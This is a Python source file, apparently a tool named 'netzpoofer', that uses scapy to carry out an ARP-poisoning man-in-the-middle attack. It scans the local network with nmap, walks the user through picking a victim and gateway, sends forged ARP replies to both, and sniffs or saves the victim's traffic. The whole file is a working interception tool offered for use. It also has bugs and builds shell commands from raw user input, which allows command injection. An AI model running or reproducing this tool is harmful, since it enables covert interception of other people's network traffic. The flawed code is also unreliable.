from scapy.all import *
import os
import sys
import threading
import signal

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):     
    print ('[*] Restoring target...')
    send(ARP(op = 2, psrc = gateway_ip, pdst = target_ip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = gateway_mac), count = 5)     
    send(ARP(op = 2, psrc = target_ip, pdst = gateway_ip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = target_mac), count = 5)      

    print('[*] Killing the process')
    os.kill(os.getpid(), signal.SIGINT)    

def get_mac(ip_address):       
    responses, unanswered = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(pdst = ip_address), timeout = 2, retry = 10)     
    for s, r in responses:
        return r[Ether].src     
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()       
    poison_target.op = 2        
    poison_target.psrc = gateway_ip     
    poison_target.pdst = target_ip      
    poison_target.hwdst = target_mac    

    poison_gateway = ARP()      
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip    
    poison_gateway.pdst = gateway_ip       
    poison_gateway.hwdst = gateway_mac    

    print ('[*] Beginning the ARP poison. [CTRL-C to stop]')
    while True:
        try:
            send(poison_target)    
            send(poison_gateway)    
            time.sleep(2)
        
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print ('[*] ARP poison attack finished.')
        return

def netzpoofer():
    print(' _     _         _                                 ____             ')
    print('(_)   (_)  ____ (_)_  _____                       (____) ____  _    ')
    print('(__)_ (_) (____)(___)(_____) ____    ___    ___  (_)__  (____)(_)__ ')
    print('(_)(_)(_)(_)_(_)(_)    _(_) (____)  (___)  (___) (____)(_)_(_)(____)')
    print('(_)  (__)(__)__ (_)_  (_)__ (_)_(_)(_)_(_)(_)_(_)(_)   (__)__ (_)   ')
    print('(_)   (_) (____) (__)(_____)(____)  (___)  (___) (_)    (____)(_)   ')
    print('                            (_)                                     ')
    print('                            (_)                                     ')

    print('')
    print('[*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*]')
    print('[*]                                                                  [*]')
    print('[*] Select your computer network device                              [*]')
    print('[*] Select the sniff target IP                                       [*]')
    print('[*] Select your network gateway                                      [*]')
    print('[*] Choose between saving or not the intercepted traffic             [*]')
    print('[*] Type [?] for help                                                [*]')
    print('[*]                                                                  [*]')
    print('[*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*]')
    print('')

    print('[*] All your network interfaces: ')
    os.system('ip -br link | awk ' + "'{print $1}'")
    print('-------------------------------------------------------------------')
    interface = input('[?] Network Interface: ')
    if(interface == '?'):
        print('[*] Your network device is the device you use to connect to the network')
        print('[*] If you are connected with a ethernet cable, then your interface is eth0')
        print('[*] If you are connected with wireless, the your interface is wlan0')
        interface = input('Network Interface: ')

    print('[*] All the possible networks: ')
    os.system("sudo ifconfig | grep inet")
    print('-------------------------------------------------------------------')
    net = input('[?] Network IP: ')
    if(net == '?'):
        print('[*] Your network address defines what network are you connected')
        print('[*] If your IP is 192.168.0.101 and mask 255.255.255.0 ')
        print('[*] The your network IP is 192.168.0.0')
        net = input('Network IP: ')

    print('[*] All the possible targets in your network: ')
    os.system("nmap -sn "+ net +'/24'" | grep for")
    print('-------------------------------------------------------------------')
    target_ip = input('[?] Target IP: ')
    if(target_ip == '?'):
        print('[*] Here is where you choose your target IP')
        print('[*] This IP is probably in the list generated above')
        print('[*] The target IP needs be inside your network')
        target_ip = input('Target IP: ')

    print('[*] Possible gateway in your network: ')
    os.system("route -n")
    gateway_ip = input('[?] Gateway IP: ')
    if(gateway_ip == '?'):
        print('[*] The gateway literally the gate between you and the internet')
        print('[*] In a simple network, this should be the routers IP')
        print('[*] If your IP is 192.168.0.101, the your gateway is probably 192.168.0.1')
        gateway_ip = input('Gateway IP: ')

    print('[*] Save intercepted packets in a .pcap file?')
    gate = input('[Y/N] ')
    if(gate == 'Y'):
        packet_count = int(input('Number of packets to intercept: '))    
        output_filename = input('Output Filename: ')
        limit_sniff(interface, gateway_ip, target_ip, packet_count, output_filename)
    else:
        constant_sniff(interface, gateway_ip, target_ip)

def limit_sniff(interface, gateway_ip, target_ip, packet_count, output_filename):

    conf.iface = interface    
    conf.verb = 0
    print ('[*] Setting up %s' %interface)
    gateway_mac = get_mac(gateway_ip)       

    if gateway_mac is None:    
        print ('[!!!] Failed to get gateway MAC. Exiting.')
        sys.exit(0)
    else:
        print ('[*] Gateway %s is at %s') % (gateway_ip, gateway_mac)      

    target_mac = get_mac(target_ip)   

    if target_mac is None:     
        print ('[!!!] Failed to get gateway MAC. Exiting.')
        sys.exit(0)
    else:
        print ('[*] Target %s is at %s' % (target_ip, target_mac))      

    poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))      
    poison_thread.start()    

    try:      
        print ('[*] Starting sniffer for %d packets' % packet_count)
        bpf_filter = 'ip host %s' %target_ip
        packets = sniff(count = packet_count, filter = bpf_filter, iface = interface)
        wrpcap(output_filename, packets)
        os.system("mv " + output_filename + " ./Files") 
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)     

    except KeyboardInterrupt:      
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)     
        sys.exit(0)

def constant_sniff(interface, gateway_ip, target_ip):
    conf.iface = interface    
    conf.verb = 0
    print ('[*] Setting up %s' %interface)
    gateway_mac = get_mac(gateway_ip)       

    if gateway_mac is None:    
        print ('[!!!] Failed to get gateway MAC. Exiting.')
        sys.exit(0)
    else:
        print ('[*] Gateway %s is at %s') % (gateway_ip, gateway_mac)      

    target_mac = get_mac(target_ip)   

    if target_mac is None:     
        print ('[!!!] Failed to get gateway MAC. Exiting.')
        sys.exit(0)
    else:
        print ('[*] Target %s is at %s' % (target_ip, target_mac))      

    poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))      
    poison_thread.start()    

    try:      
        print ('[*] Starting sniffer packets')
        bpf_filter = 'ip host %s' %target_ip
        while True:
            packets = sniff(count = 1, filter = bpf_filter, iface = interface)
            #packets = sniff(count = 1, prn = lambda x: x.show(), filter = bpf_filter, iface = interface, store = 0)
            packets.show() 
    except KeyboardInterrupt:      
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)